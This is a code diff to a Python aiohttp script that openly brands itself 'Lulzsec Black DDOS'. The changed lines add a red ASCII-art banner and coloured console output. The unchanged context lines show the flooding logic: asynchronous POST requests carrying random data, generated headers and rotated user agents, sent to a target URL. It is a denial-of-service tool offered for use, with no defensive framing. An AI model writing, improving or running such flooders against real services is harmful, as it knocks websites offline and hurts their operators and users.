@@ -1,8 +1,15 @@
-
 import aiohttp
 import asyncio
 import random
 import string
+import pyfiglet
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+# عرض الاسم بتنسيق ASCII art
+ascii_banner = pyfiglet.figlet_format("Lulzsec Black DDOS")
+print(Fore.RED + ascii_banner)
 
 async def send_request(session, url):
     try:
@@ -10,10 +17,10 @@ async def send_request(session, url):
         data = generate_random_data()
         headers = generate_headers()
         async with session.post(url, data=data, headers=headers) as response:
-            print("Request sent:", response.status)
+            print(Fore.GREEN + "Request sent:", response.status)
             await asyncio.sleep(0.1)  # توزيع الطلبات بين الاستجابات
     except Exception as e:
-        print("Error:", e)
+        print(Fore.RED + "Error:", e)
 
 def generate_user_agent():
     user_agents = load_file('user_agents.txt')
@@ -46,7 +53,7 @@ def load_file(file_path):
             lines = file.read().splitlines()
         return lines
     except FileNotFoundError:
-        print(f"No file found at {file_path}")
+        print(Fore.YELLOW + f"No file found at {file_path}")
         return []
 
 async def main():
